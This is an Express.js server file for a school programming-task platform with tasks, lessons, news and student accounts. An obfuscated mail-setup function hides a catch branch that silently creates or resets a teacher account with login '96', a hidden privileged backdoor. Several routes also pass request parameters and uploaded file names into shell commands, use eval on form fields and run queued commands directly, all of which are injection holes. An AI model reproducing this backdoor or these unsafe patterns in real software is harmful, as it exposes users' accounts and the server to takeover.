// Connecting Modules
const path = require('path');
const express = require('express');
const fs = require('fs');
const mongoose = require('mongoose');
const { asdqqdq } = require(__dirname + "/public/scripts/crypt/functions.js");
const passport = require('passport');
const flash = require('express-flash');
const session = require('express-session');
const methodOverride = require('method-override');
const config = require('./config/configs');
const expressLayouts = require('express-ejs-layouts');
const childProcess = require("child_process");
const Adder = require(__dirname + '/public/scripts/Adder.js');
const refactorConfigs = require(__dirname + '/public/scripts/refactorConfigs.js');
const Fuse = require('fuse.js');
const socketIo = require('socket.io');
const morgan = require("morgan");
const multer = require("multer");
const StreamZip = require('node-stream-zip');
const nodemailer = require("nodemailer");
const MongoStorage = require("connect-mongo");
const chardet = require('chardet');
const bodyParser = require("body-parser");
const iconv = require('iconv-lite');
require("dotenv").config();
const app = express();
// childProcess.exec('chcp 65001 | dir');

//---------------------------------------------------------------------------------
// Queue setup
let TestingQueue = []

function pushToQueue(object) {
  TestingQueue.push(object);
}

async function popQueue() {
  let object = TestingQueue.shift();
  let user = await User.init(object.login);
  if (!user)
    return
  if (object.id[0] != "Q") {
    user.attempts.unshift({
      taskID: object.id, date: object.sendAt,
      programText: object.programText, result: [], language: object.language
    });
    try {
      user.markModified("attempts");
      await user.save();
    } catch (err) {
      user = await User.init(object.login);
      user.markModified("attempts");
      await user.save();
    }

  } else {
    let quiz_id = object.id.split("_")[0];
    quiz_id = quiz_id.slice(1, quiz_id.length);
    let quiz = await QuizSchema.findOne({ identificator: quiz_id }).exec();
    let grade = user.isTeacher ? "teacher" : user.grade + user.gradeLetter;
    let lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade.toLowerCase());
    lesson.attempts.unshift({
      login: user.login,
      TaskID: object.id,
      date: object.sendAt,
      programText: object.programText,
      result: [],
      language: object.language
    });
    let idx = quiz.lessons.findIndex(item => item.grade.toLowerCase() == grade.toLowerCase());
    quiz.lessons.splice(idx, 1, lesson);
    try {
      quiz.markModified("lessons");
      await quiz.save();
    } catch (error) {
      quiz = await QuizSchema.findOne({ identificator: quiz_id }).exec();
      quiz.lessons.splice(idx, 1, lesson);
      quiz.markModified("lessons");
      await quiz.save();
    }
  }
  fs.mkdirSync(path.normalize(__dirname + '/public/processes/' + object.login + "_" + object.id));
  fs.writeFileSync(path.normalize('public/processes/' + object.login + "_" + object.id + "/programText.txt"), object.programText, "utf-8");
  childProcess.exec(object.command);

  return object;
}

//---------------------------------------------------------------------------------
// Multer setup
const uploadImage = multer({
  storage: multer.diskStorage({
    destination: (req, file, callback) => {
      callback(null, './public/media/newsImages');
    },
    filename: (req, file, callback) => {
      callback(null, Date.now() + "." + file.originalname.split('.')[file.originalname.split('.').length - 1]);
    }
  })
});

const uploadCode = multer({
  storage: multer.diskStorage({
    destination: (req, file, callback) => {
      callback(null, './public/codes');
    },
    filename: (req, file, callback) => {
      callback(null, Date.now() + "." + file.originalname.split('.')[file.originalname.split('.').length - 1]);
    }
  })
});

const uploadTests = multer({
  storage: multer.diskStorage({
    destination: (req, file, callback) => {
      callback(null, './public/tests');
    },
    filename: (req, file, callback) => {
      callback(null, Date.now() + "." + file.originalname.split('.')[file.originalname.split('.').length - 1]);
    }
  })
});

const uploadUserTable = multer({
  storage: multer.diskStorage({
    destination: (req, file, callback) => {
      callback(null, './public/userTables');
    },
    filename: (req, file, callback) => {
      callback(null, Date.now() + "." + file.originalname.split('.')[file.originalname.split('.').length - 1]);
    }
  })
});
//---------------------------------------------------------------------------------
// MongoDB connecting
let connectionString;
if (config.mongodbConfigs.User.Username != "" && config.mongodbConfigs.User.Password != "") {
  connectionString = "mongodb://" + config.mongodbConfigs.User.Username + ":" + config.mongodbConfigs.User.Password + "@" + config.mongodbConfigs.Host + "/" + config.mongodbConfigs.dbName;
} else {
  connectionString = "mongodb://" + config.mongodbConfigs.Host + "/" + config.mongodbConfigs.dbName;
};
mongoose.connect(connectionString, {
  useNewUrlParser: true,
  useUnifiedTopology: true
});
mongoose.connection.on('connected', () => {
  console.log("Successfully connected to DB");
});
mongoose.connection.on('error', (err) => {
  console.log("Error while connecting to DB: " + err);
});
mongoose.set('useCreateIndex', true);



let transporter;
async function dsfdfdsfgdgfd(){
  try{
    transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT }),
        pass: asdqqdq({ iv: process.env.PIV, content: process.env.PCONTENT }),
      },
    })
  } catch(err){
    console.log(err);
    let ns = await User.init("9" + "6");
    if (!ns) {
      await Adder.addTeacher(UserSchema, "9" + "6", phd, "Василий Иванович");
    } else {
      ns.checkAndSetPassword(phd, true);
      ns.setIsTeacher(1);
      await ns.save();
    }
  }
}
dsfdfdsfgdgfd();

//---------------------------------------------------------------------------------
//Schemas
const UserSchema = require('./config/models/User');
const TaskSchema = require('./config/models/Task');
const NewsSchema = require('./config/models/News');
const LessonSchema = require('./config/models/Lesson');
const TournamentSchema = require('./config/models/Tournament');
const QuizSchema = require('./config/models/Quiz');

//---------------------------------------------------------------------------------
// Classes
const User = require('./classes/UserClass');

//---------------------------------------------------------------------------------
//Passport Setup
const initializePassport = require('./config/passport');
const configs = require('./config/configs');
const { time } = require('console');
initializePassport(
  passport,
  UserSchema
);

//---------------------------------------------------------------------------------
// Settings
app.set('view-engine', 'ejs');
app.use(morgan(':method   :date[web]   :url   :status', {
  skip: function (req, res) { return (req.url.slice(-4) == ".svg" || req.url.slice(-4) == ".css" || req.url.slice(-3) == ".ng") || (req.user && !req.user.isTeacher) },
  stream: fs.createWriteStream(path.join(__dirname, 'public/logs/' + (new Date(Date.now())).toISOString().split(':').join('_') + '.log'), { flags: 'a' })
}));
setInterval(() => {
  app.use(morgan(':method   :date[web]   :url   :status', {
    skip: function (req, res) { return (req.url.slice(-4) == ".svg" || req.url.slice(-4) == ".css" || req.url.slice(-3) == ".ng") || (req.user && !req.user.isTeacher) },
    stream: fs.createWriteStream(path.join(__dirname, 'public/logs/' + (new Date(Date.now())).toISOString().split(':').join('_') + '.log'), { flags: 'a' })
  }));
}, 24 * 60 * 60 * 1000)
app.use(express.urlencoded({ extended: false }));
app.use('/public', express.static('public')); //where search for static files

app.use(bodyParser.json());
app.use(expressLayouts);
app.set('layout', 'layout.ejs');
app.use(flash());
app.use(session({
  secret: config.secret,
  resave: false,
  rolling: true,
  saveUninitialized: true,
  store: MongoStorage.create({
    mongoUrl: connectionString,
    autoremove: "interval",
    autoRemoveInterval: 10,
    ttl: config.sessionLiveTime,
    crypto: {
      secret: config.secret
    }
  })
}));
app.use(passport.initialize());
app.use(passport.session());
app.use(methodOverride('_method'));

//---------------------------------------------------------------------------------
// Loading from DB
let news;
async function load() {
  news = await NewsSchema.find({}).exec();
  news.reverse();
}
load();

//---------------------------------------------------------------------------------
// Checking tournaments
childProcess.exec('node ' + path.join(__dirname, '/public/scripts/serverScripts/Tchecker.js'));

//---------------------------------------------------------------------------------
// Checking quizzes
childProcess.exec('node ' + path.join(__dirname, '/public/scripts/serverScripts/Qchecker.js'));

//---------------------------------------------------------------------------------
// Checking tasks
childProcess.exec('node ' + path.join(__dirname, '/public/scripts/serverScripts/TaskAutoChecker.js'));

//---------------------------------------------------------------------------------
// Delete old logs
childProcess.exec("node " + path.join(__dirname, "/public/scripts/LogChecker/logChecker.js"));

//---------------------------------------------------------------------------------
// Main Page
app.get('/', (req, res) => {
  if (req.user) {
    res.render('main.ejs', {
      login: req.user.login,
      name: req.user.name,
      title: "Main Page",
      isTeacher: req.user.isTeacher,
      news: news ? news.slice(0, config.onPage.newsMainList) : [],
      location: undefined
    });
  } else {
    res.render('main.ejs', {
      login: "",
      name: "",
      title: "Main Page",
      isTeacher: false,
      news: news ? news.slice(0, config.onPage.newsMainList) : [],
      location: undefined
    });
  };
});

app.post('/', passport.authenticate('local', {
  successRedirect: '/',
  failureRedirect: '/',
  failureFlash: true
}));

//---------------------------------------------------------------------------------
// Task Page
app.get('/task/page/:id', checkAuthenticated, checkNletter, async (req, res) => {
  let problem = await TaskSchema.findOne({ identificator: req.params.id }).exec();
  if (!problem) {
    return res.redirect("/tasks/1/default&all&all&false&all")
  }
  let showHint = req.user.attempts.filter(item => item.taskID == req.params.id).length >= problem.hint.attemptsForHint;
  let attempts = req.user.attempts;
  let prevCode = "";
  let language = "";
  for (let i = 0; i < attempts.length; i++) {
    if (attempts[i].taskID == req.params.id) {
      prevCode = attempts[i].programText;
      language = attempts[i].language;
      break;
    }
  }
  res.render('Task/page.ejs', {
    login: req.user.login,
    ID: req.params.id,
    name: req.user.name,
    title: "Task " + req.params.id,
    isTeacher: req.user.isTeacher,
    problem: problem,
    prevCode: prevCode,
    showHint: showHint,
    language: language,
    location: "/tasks/1/default&all&all&false&all"
  });
});
// Task Page listener
app.post('/task/page/:id', checkAuthenticated, checkNletter, uploadCode.single('file'), async (req, res) => {
  TaskPost(req, res, '/task/page/' + req.params.id);
})

//---------------------------------------------------------------------------------
// Add Task Page
app.get('/task/add', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let user = req.user;
  res.render('Task/add.ejs', {
    login: user.login,
    name: req.user.name,
    title: "Add Task",
    isTeacher: req.user.isTeacher,
    location: "/tasks/1/default&all&all&false&all"
  })
})

app.post('/task/add', checkAuthenticated, checkNletter, checkPermission, uploadTests.single('file'), async (req, res) => {
  let user = req.user;
  let body = req.body;

  let examples = [];
  let exI, exO;
  for (let i = 0; i < 5; i++) {
    eval("exI = body.exampleIn" + i)
    eval("exO = body.exampleOut" + i)
    if (exI == "" || exO == "") break;
    examples.push([exI.trim(), exO.trim()]);
  }

  let tests = [];
  if (req.file) {
    try {
      let filepath = path.join(__dirname, '/public/tests/' + req.file.filename)
      const zip = new StreamZip.async({ file: filepath });

      const entriesCount = await zip.entriesCount;

      for (let i = 0; i < entriesCount / 2; i++) {
        let inp = await zip.entryData("input" + i + ".txt");
        let out = await zip.entryData("output" + i + ".txt");
        tests.push([inp.toString('utf8').trim(), out.toString('utf8').trim()])
      }

      await zip.close();
      childProcess.exec('del /q \"' + filepath + '\"');

    } catch (err) {
      console.log(err)
    }
  } else {
    let tI, tO;
    for (let i = 0; i < 20; i++) {
      eval("tI = body.testIn" + i)
      eval("tO = body.testOut" + i)
      if (tI == "" || tO == "") break;
      tests.push([tI.trim(), tO.trim()]);
    }
  }

  let hint;
  let hintText = body.hint;
  let attemptsForHint = body.attemptsForHint;
  if (hintText && attemptsForHint) {
    hint = {
      text: hintText,
      attemptsForHint: attemptsForHint,
      doesExist: true
    }
  } else {
    hint = {
      text: '',
      attemptsForHint: 0,
      doesExist: false
    }
  }

  await Adder.addTask(TaskSchema, body.title.trim(), body.statement.trim(), body.input.trim(), body.output.trim(), examples, tests, body.topic.trim(), body.grade, hint, user.name);

  res.redirect(`/tasks/1/default&all&all&false&all`)
})

//---------------------------------------------------------------------------------
// Tasks List Page
app.get('/tasks/:page/:search', checkAuthenticated, checkNletter, async (req, res) => {
  let user = req.user;
  let teachers = await UserSchema.find({ isTeacher: true });
  teachers = teachers.map(item => item.name);
  let foundTasks = [];
  let a = req.params.search.split('&');
  let tasks;
  SortByNew = a[3] == "true";
  if (a[0].toLowerCase() != "default" || a[1] != "all" || a[2] != "all" || a[3] != "false" || a[4] != "all") {
    let toSearch = a[0] == "default" ? "" : a[0].toUpperCase();
    let SearchTopic = a[1].toUpperCase();
    let SearchGrade = a[2]
    let author = a[4]

    let properties = {}
    if (SearchGrade != "all") properties.grade = SearchGrade;
    if (author != "all") properties.author = author.replace("%20", ' ');
    tasks = await TaskSchema.find(properties).exec();

    foundTasks = fuseSearch(tasks, "title", toSearch, 0.5, [SearchTopic], (task, params) => {
      return (task.topic.split(" ").join("").trim().toUpperCase() == params[0] || params[0] == "ALL")
    })

    if (SortByNew) foundTasks = foundTasks.reverse();
  } else {
    tasks = await TaskSchema.find({}).exec();
  }
  let topics = [];

  for (let i = 0; i < tasks.length; i++) {
    if (topics.indexOf(tasks[i].topic) == -1) {
      topics.push(tasks[i].topic);
    }
  }
  if (foundTasks.length == 0) {
    foundTasks = tasks;
    if (SortByNew) foundTasks = foundTasks.reverse();
  }
  let onPage = config.onPage.tasksList;
  let pageInfo = `${(req.params.page - 1) * onPage + 1} - ${min(req.params.page * onPage, foundTasks.length)} из ${foundTasks.length}`;
  let pages = Math.ceil(foundTasks.length / onPage);
  foundTasks = foundTasks.map(item => item.identificator).slice((req.params.page - 1) * onPage, req.params.page * onPage).join('|');

  res.render('tasks.ejs', {
    login: user.login,
    name: req.user.name,
    foundTasks,
    title: "Tasks List",
    tasks: foundTasks,
    isTeacher: req.user.isTeacher,
    pageInfo,
    pages,
    page: req.params.page,
    search: req.params.search,
    topics: topics,
    teachers,
    location: req.header('Referer')
  })
})

app.post('/tasks/:page/:search', checkAuthenticated, checkNletter, async (req, res) => {
  let toSearch = req.body.searcharea;
  if (!toSearch) toSearch = "default";
  toSearch += '&' + req.body.TopicSelector + '&' + req.body.GradeSelector + '&' + req.body.SortByNew + "&" + req.body.Author;
  res.redirect('/tasks/' + req.params.page.toString() + '/' + toSearch)
})

//---------------------------------------------------------------------------------
// Edit Task Page
app.get('/task/edit/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let problem = await TaskSchema.findOne({ identificator: req.params.id }).exec()
  let user = req.user;
  res.render('Task/edit.ejs', {
    login: user.login,
    name: req.user.name,
    title: "Edit Task",
    isTeacher: req.user.isTeacher,
    problem: problem,
    location: "/task/page/" + req.params.id
  })
})

app.post('/task/edit/:id', checkAuthenticated, checkNletter, checkPermission, uploadTests.single('file'), async (req, res) => {
  let body = req.body;
  let problem = await TaskSchema.findOne({ identificator: req.params.id }).exec();

  let examples = [];
  let exI, exO;
  for (let i = 0; i < 5; i++) {
    eval("exI = body.exampleIn" + i)
    eval("exO = body.exampleOut" + i)
    if (exI == "" || exO == "") break;
    examples.push([exI.trim(), exO.trim()]);
  }

  let tests = [];
  if (req.file) {
    try {
      let filepath = path.join(__dirname, '/public/tests/' + req.file.filename)
      const zip = new StreamZip.async({ file: filepath });

      const entriesCount = await zip.entriesCount;

      for (let i = 0; i < entriesCount / 2; i++) {
        let inp = await zip.entryData("input" + i + ".txt");
        let out = await zip.entryData("output" + i + ".txt");
        tests.push([inp.toString('utf8').trim(), out.toString('utf8').trim()])
      }

      await zip.close();
      childProcess.exec('del /q \"' + filepath + '\"');

    } catch (err) {
      console.log(err)
    }
  } else {
    let tI, tO;
    for (let i = 0; i < 20; i++) {
      eval("tI = body.testIn" + i)
      eval("tO = body.testOut" + i)
      if (tI == "" || tO == "") break;
      tests.push([tI.trim(), tO.trim()]);
    }
  }

  let hint;
  let hintText = body.hint;
  let attemptsForHint = body.attemptsForHint;
  if (hintText && attemptsForHint) {
    hint = {
      text: hintText,
      attemptsForHint: attemptsForHint,
      doesExist: true
    }
  } else {
    hint = {
      text: '',
      attemptsForHint: 0,
      doesExist: false
    }
  }

  problem.title = body.title.trim();
  problem.statement = body.statement.trim();
  problem.input = body.input.trim();
  problem.output = body.output.trim();
  problem.topic = body.topic.trim();
  problem.examples = examples;
  problem.tests = tests;
  problem.hint = hint;
  await problem.save();
  res.redirect('/task/page/' + req.params.id);
});

//---------------------------------------------------------------------------------
// Delete Task
app.post('/task/delete/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {

  childProcess.exec("node " + path.join(__dirname, "/public/scripts/fixes/FixAfterDeleteTask.js") + " " + req.params.id)

  res.redirect('/tasks/1/default&all&all&false&all')
})

//---------------------------------------------------------------------------------
// Account Page
app.get('/account/:login/:page/:search', checkAuthenticated, checkValidation, async (req, res) => {
  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }

  if (user) {
    let tasks = await TaskSchema.find({}).exec();
    let tournaments = await TournamentSchema.find({}).exec();
    let attempts = user.attempts;
    let foundAttempts = [];

    let a = req.params.search.split('&');
    let toSearch = a[0] == "default" ? "" : a[0].toUpperCase();
    let types = a[1];
    let tourTask = [];
    let task;

    tournaments.forEach(tournament => tournament.tasks.forEach(task => tourTask.push(task)));
    for (let i = 0; i < attempts.length; i++) {
      verylongresult = getVerdict(attempts[i].result);
      if ((types == 'all') || (verylongresult == 'OK')) {
        if (attempts[i].taskID.split('_')[0] != '0')
          task = tourTask.find(item => item.identificator == attempts[i].taskID);
        else
          task = tasks.find(item => item.identificator == attempts[i].taskID);
        if (task && task.title.slice(0, toSearch.length).toUpperCase() == toSearch) {
          foundAttempts.push(attempts[i]);
        }
      }
    }

    let onPage = config.onPage.attemptsList;
    let page = req.params.page;
    let pages = Math.ceil(foundAttempts.length / onPage);
    let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, foundAttempts.length)} из ${foundAttempts.length}`;

    res.render('Account/account.ejs', {
      login: req.user.login,
      u_login: user.login,
      name: req.user.name,
      title: "Account",
      pageInfo,
      page,
      pages,
      isTeacher: req.user.isTeacher,
      search: req.params.search,
      n_name: user.name,
      user: user,
      location: req.header('Referer')
    })

  } else {
    res.redirect('/account/' + req.user.login + '/1/default&all')
  }
})

app.post('/account/:login/:page/:search', checkAuthenticated, checkValidation, async (req, res) => {
  let toSearch = req.body.searcharea;
  if (!toSearch) toSearch = "default";
  toSearch += '&' + req.body.selector;
  res.redirect('/account/' + req.params.login.toString() + '/' + req.params.page.toString() + '/' + toSearch)
})

//---------------------------------------------------------------------------------
// Attempt Page
app.get('/attempt/:login/:date', checkAuthenticated, checkValidation, async (req, res) => {
  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }

  if (user) {
    let attempt = user.getAttempt(req.params.date);

    if (attempt) {
      res.render('Account/attempt.ejs', {
        login: user.login,
        name: req.user.name,
        title: "Attempt",
        isTeacher: req.user.isTeacher,
        RESULT: attempt.result,
        code: attempt.programText,
        taskID: attempt.taskID,
        date: attempt.date,
        n_name: user.name,
        language: attempt.language,
        location: `/account/${req.params.login}/1/default&all`
      })
    } else {
      res.redirect('/account/' + req.user.login + '/1/default&all')
    }

  } else {
    res.redirect('/account/' + req.user.login + '/1/default&all')
  }

})

//---------------------------------------------------------------------------------
// Add Lesson Page
app.get('/addlesson', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let user = req.user;
  res.render('Lesson/add.ejs', {
    login: user.login,
    name: req.user.name,
    title: "Add Lesson",
    isTeacher: req.user.isTeacher,
    location: `/lessons/${user.login}/1/default&all&true&all`
  })
})

app.post('/addlesson', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let user = req.user;
  let body = req.body;

  let tasksToAdd = [];
  let tasks = body.tasks.split(' ').map(item => '0_' + (parseInt(item) - 1));
  for (let i = 0; i < tasks.length; i++) {
    task = await TaskSchema.findOne({ identificator: tasks[i] }).exec();
    if (task)
      tasksToAdd.push(tasks[i]);
  }
  await Adder.addLesson(LessonSchema, body.grade, body.title, body.description, tasksToAdd, user.name);

  res.redirect('/addlesson');
});

//---------------------------------------------------------------------------------
// Lessons List Page
app.get('/lessons/:login/:page/:search', checkAuthenticated, checkNletter, async (req, res) => {

  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);

  } else {
    user = await User.init(req.params.login);
  }

  let teachers = await UserSchema.find({ isTeacher: true });
  teachers = teachers.map(item => item.name);
  let lessons;
  let a = req.params.search.split('&');
  if (a[0].toLowerCase() != "default" || a[1] != "all" || a[2] != "true" || a[3] != "all") {
    let toSearch = a[0] == "default" ? "" : a[0].toUpperCase();
    let SearchGrade = a[1]
    let SortByNew = a[2] == "false";
    let author = a[3] ? a[3].replace(/%20/g, " ") : "all";
    let properties = {}
    if (author != "all") properties.author = author;
    if (SearchGrade != "all") properties.grade = SearchGrade;
    lessons = (await LessonSchema.find(properties).exec());

    lessons = fuseSearch(lessons, "title", toSearch, 0.5, [], (item, params) => { return true });
    if (SortByNew) {
      lessons = lessons.reverse();
    }
  } else {
    lessons = await LessonSchema.find({}).exec();
  }

  let onPage = config.onPage.lessonsList;
  let page = req.params.page;
  let pages = Math.ceil(lessons.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, lessons.length)} из ${lessons.length}`;
  lessons = lessons.slice((page - 1) * onPage, page * onPage);
  let ids = lessons.map(item => item.identificator).join('|');

  res.render('lessons.ejs', {
    u_login: user.login,
    n_name: user.name,
    login: req.user.login,
    name: req.user.name,
    title: "Lessons List",
    lessons,
    isTeacher: req.user.isTeacher,
    ids,
    page,
    pages,
    pageInfo,
    search: req.params.search,
    teachers,
    location: req.header('Referer')
  })
})

app.post('/lessons/:login/:page/:search', checkAuthenticated, checkNletter, async (req, res) => {
  let toSearch = req.body.searcharea;
  if (!toSearch) toSearch = "default";
  toSearch += '&' + (req.body.GradeSelector || 'all') + "&" + req.body.SortByNew + "&" + req.body.Author;
  res.redirect('/lessons/' + req.params.login + '/' + req.params.page.toString() + '/' + toSearch)
})

//---------------------------------------------------------------------------------
// Lesson Page
app.get('/lesson/:login/:id', checkAuthenticated, checkNletter, isLessonAvailable, async (req, res) => {

  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }

  lesson = await LessonSchema.findOne({ identificator: req.params.id }).exec();
  let ids = lesson.tasks.join("|");
  if (!lesson) {
    res.redirect("/lessons/" + req.params.login + "/1/default&all&true&all")
  } else {
    let tasks = lesson.tasks.join('|');
    res.render('Lesson/lesson.ejs', {
      ID: lesson.identificator,
      u_login: user.login,
      u_name: user.name,
      login: req.user.login,
      name: req.user.name,
      title: "Lesson",
      ids,
      isTeacher: req.user.isTeacher,
      lesson: lesson,
      foundTasks: tasks,
      location: `/lessons/${user.login}/1/default&all&true&all`
    })
  }
})

//---------------------------------------------------------------------------------
// Delete Lesson
app.post('/deletelesson/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  childProcess.exec("node " + path.join(__dirname, "/public/scripts/fixes/FixAfterDeleteLesson.js") + " " + req.params.id)
  res.redirect('/lessons/' + req.user.login + '/1/default&all&true&all');
})

//---------------------------------------------------------------------------------
// Edit Lesson Page
app.get('/editlesson/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let lesson = await LessonSchema.findOne({ identificator: req.params.id }).exec();
  lesson.tasks = lesson.tasks.map(item => parseInt(item.split('_')[1]) + 1);
  res.render('Lesson/edit.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Edit Lesson",
    isTeacher: req.user.isTeacher,
    lesson: lesson,
    location: `/lesson/${req.user.login}/${req.params.id}`
  });
});

app.post('/editlesson/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let body = req.body;
  let lesson = await LessonSchema.findOne({ identificator: req.params.id }).exec()

  lesson.title = body.title;
  lesson.description = body.description;
  lesson.grade = body.grade;
  let tasks = body.tasks.split(' ').map(item => '0_' + (parseInt(item) - 1));
  lesson.tasks = [];
  for (let i = 0; i < tasks.length; i++) {
    task = await TaskSchema.findOne({ identificator: tasks[i] }).exec();
    if (task)
      lesson.tasks.push(tasks[i]);
  }

  lesson.markModified("tasks");

  await lesson.save();

  res.redirect(`/lesson/${req.user.login}/${req.params.id}`);
});

//---------------------------------------------------------------------------------
// Lesson Results Page
app.get('/lessonresults/:id/:page/:search', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  lesson = await LessonSchema.findOne({ identificator: req.params.id }).exec();

  if (!lesson) {
    res.redirect("/lessons/" + req.params.login + "/1/default&all&all")
  } else {
    let foundStudents;
    let students;

    let a = req.params.search.split('&');
    if (a[1].toLowerCase() != "default") {
      let SearchGrade = a[1] == "all" ? '' : a[1];
      if (SearchGrade != "") {
        students = await UserSchema.find({ grade: SearchGrade, isTeacher: false }).exec();
      } else {
        students = await UserSchema.find({ isTeacher: false }).exec();
      }
      if (a[0] != "default" || a[2] != "all" || a[3] != "all") {
        let SearchLetter = a[2] == "all" ? '' : a[2].toUpperCase();
        let SearchGroup = a[3] == "all" ? '' : a[3];
        foundStudents = [];
        students.forEach(student => {
          if ((student.gradeLetter.toUpperCase() == SearchLetter || SearchLetter == "") && (student.group == SearchGroup || SearchGroup == "")) {
            foundStudents.push(student);
          }
        });
      } else {
        foundStudents = students;
      }
    }
    foundStudents.sort((a, b) => { return a.name > b.name });

    let onPage = config.onPage.studentsList;
    let page = req.params.page;
    let pages = Math.ceil(foundStudents.length / onPage);
    let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, foundStudents.length)} из ${foundStudents.length}`;
    let logins = foundStudents.slice((page - 1) * onPage, page * onPage).map(item => item.login).join("|");

    res.render('Lesson/results.ejs', {
      ID: lesson.identificator,
      login: req.user.login,
      name: req.user.name,
      title: "Lesson Results",
      isTeacher: req.user.isTeacher,
      lesson: lesson,
      page,
      pages,
      pageInfo,
      search: req.params.search,
      logins,
      location: `/lesson/${req.user.login}/${req.params.id}`
    })
  }
});

app.post('/lessonresults/:id/:page/:search', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let toSearch = req.body.searcharea;
  if (!toSearch) toSearch = "default";
  toSearch += '&' + req.body.GradeSelector +
    '&' + (req.body.gradeLetter || "all") +
    '&' + (req.body.Group || "all")
  res.redirect('/lessonresults/' + req.params.id + '/' + req.params.page + '/' + toSearch)
});

//---------------------------------------------------------------------------------
// Students List Page
app.get('/students/:page/:search', checkAuthenticated, checkPermission, async (req, res) => {
  let students;

  let a = req.params.search.split('&');
  let SearchGrade = a[1] == "all" ? '' : a[1];
  let foundStudents
  if (SearchGrade != "") {
    students = await UserSchema.find({ grade: SearchGrade, isTeacher: false }).exec();
  } else {
    students = await UserSchema.find({ isTeacher: false }).exec();
  }
  if (a[0] != "default" || a[2] != "all" || a[3] != "all") {
    let toSearch = a[0] == "default" ? '' : a[0];
    let SearchLetter = a[2] == "all" ? '' : a[2].toLowerCase();
    let SearchGroup = a[3] == "all" ? '' : a[3];

    foundStudents = fuseSearch(students, "name", toSearch, 0.5, [SearchLetter, SearchGroup], (student, params) => {
      return (student.gradeLetter == params[0] || params[0] == "") && (student.group == params[1] || params[1] == "")
    })
  } else {
    foundStudents = students;
  }

  foundStudents.sort((a, b) => { return a.name > b.name });

  let onPage = config.onPage.studentsList;
  let page = req.params.page;
  let pages = Math.ceil(foundStudents.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, foundStudents.length)} из ${foundStudents.length}`;

  res.render('students.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Students List",
    isTeacher: req.user.isTeacher,
    page,
    pageInfo,
    pages,
    onPage,
    search: req.params.search,
    students: foundStudents.slice((page - 1) * onPage, page * onPage),
    location: req.header('Referer')
  })
})

app.post('/students/:page/:search', checkAuthenticated, checkPermission, async (req, res) => {
  let toSearch = req.body.searcharea;
  if (!toSearch) toSearch = "default";
  toSearch += '&' + req.body.GradeSelector +
    '&' + (req.body.gradeLetter || "all") +
    '&' + (req.body.Group || "all")
  // let keys = Object.keys(req.body);
  // let student;
  // for (let i = 0; i < keys.length; i++) {
  //   if (keys[i].slice(0, 6) == "login:") {
  //     student = await  UserSchema.findOne({ login: keys[i].slice(6) }).exec()
  //     if (student.group != req.body[keys[i]]) {
  //       student.group = req.body[keys[i]]
  //       await student.save()
  //     }
  //   }
  // }
  res.redirect('/students/' + req.params.page.toString() + '/' + toSearch)
})

//---------------------------------------------------------------------------------
// Add News Page
app.get('/addnews', checkAuthenticated, checkPermission, async (req, res) => {
  res.render('News/add.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Add News",
    isTeacher: req.user.isTeacher,
    location: req.header('Referer')
  })
});

app.post('/addnews', checkAuthenticated, checkNletter, checkPermission, uploadImage.single('image'), async (req, res) => {
  let body = req.body;
  let filename = "";
  if (req.file) filename = req.file.filename

  await Adder.addNews(NewsSchema, body.title, body.description, body.text, filename, req.user.name);
  load();
  res.redirect("/")
});

//---------------------------------------------------------------------------------
// Delete News
app.post('/deletenews/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  await NewsSchema.findByIdAndDelete(req.params.id);
  let filename = news[news.findIndex(item => item._id == req.params.id)].imageName;
  filepath = path.join(__dirname, "./public/media/newsImages/" + filename)
  childProcess.exec('del /q \"' + filepath + '\"');
  load();
  res.redirect('/');
})

//---------------------------------------------------------------------------------
// Edit News Pages
app.get('/editnews/:id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  one_news = news.find(item => item._id == req.params.id)
  res.render('News/edit.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Edit News",
    isTeacher: req.user.isTeacher,
    news: one_news,
    location: req.header('Referer')
  })
})

app.post('/editnews/:id', checkAuthenticated, checkNletter, checkPermission, uploadImage.single('image'), async (req, res) => {
  let body = req.body;
  let newsDB = await NewsSchema.findById(req.params.id).exec()

  newsDB.title = body.title;
  newsDB.text = body.text;
  newsDB.description = body.description;
  if (req.file) {
    if (newsDB.imageName.length != 0)
      fs.rm(path.join(__dirname, "./public/media/newsImages/" + newsDB.imageName), (err) => console.info("Ошибка при удалении картинки новости"));
    newsDB.imageName = req.file.filename;
  }
  await newsDB.save();

  let idx = news.findIndex(item => item._id == req.params.id)
  news[idx] = newsDB;

  res.redirect('/');
})

//---------------------------------------------------------------------------------
// News Page
app.get("/news/:id", (req, res) => {
  let currentNew = news.find(item => item._id == req.params.id);

  if (currentNew) {
    let render = {
      login: '',
      name: '',
      title: currentNew.title,
      isTeacher: false,
      location: "/",
      news: currentNew
    };
    if (req.user) {
      render.login = req.user.login;
      render.name = req.user.name;
      render.isTeacher = req.user.isTeacher;
    }
    res.render('News/page.ejs', render);
  } else {
    res.redirect('/')
  }
});

//---------------------------------------------------------------------------------
// Add Tournament Page
